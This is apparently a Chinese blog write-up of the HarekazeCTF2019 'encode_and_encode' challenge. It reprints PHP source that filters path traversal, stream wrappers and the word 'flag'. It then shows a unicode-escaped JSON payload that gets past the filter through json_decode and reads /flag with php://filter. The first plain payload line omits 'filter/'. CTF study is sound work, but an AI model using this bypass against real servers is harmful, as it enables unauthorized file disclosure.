---
title: '[HarekazeCTF2019]encode_and_encode'
date: 2024-06-16 19:39:58
tags: 题解
categories: 刷题笔记
---

### [HarekazeCTF2019]encode_and_encode

我们进行代码审计

```
<?php
error_reporting(0);

if (isset($_GET['source'])) {
  show_source(__FILE__);
  exit();
}

function is_valid($str) {
  $banword = [
    // no path traversal
    '\.\.',
    // no stream wrapper
    '(php|file|glob|data|tp|zip|zlib|phar):',
    // no data exfiltration
    'flag'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}

$body = file_get_contents('php://input');
$json = json_decode($body, true);

if (is_valid($body) && isset($json) && isset($json['page'])) {
  $page = $json['page'];
  $content = file_get_contents($page);
  if (!$content || !is_valid($content)) {
    $content = "<p>not found</p>\n";
  }
} else {
  $content = '<p>invalid request</p>';
}

// no data exfiltration!!!
$content = preg_replace('/HarekazeCTF\{.+\}/i', 'HarekazeCTF{&lt;censored&gt;}', $content);
echo json_encode(['content' => $content]);
```

代码要求我们输入json格式的数据，然后进行过滤，将结果传入file_get_contents进行读取

我们来看is_vaild方法，它将一大堆伪协议进行了过滤

我们知道json_decode会将`\uxxx`进行转义，这样就可以绕过is_valid检测

<!--more-->

payload

```
php://convert.base64-encode/resource=/flag
```

我们将payload用unicode进行编码

![image-20240616203241607](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406162032736.png)

```
\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067
```

我们得到最终payload

```
{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}
```

![image-20240616203326697](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406162033752.png)

得到base64字符串，我们进行解码，得到flag
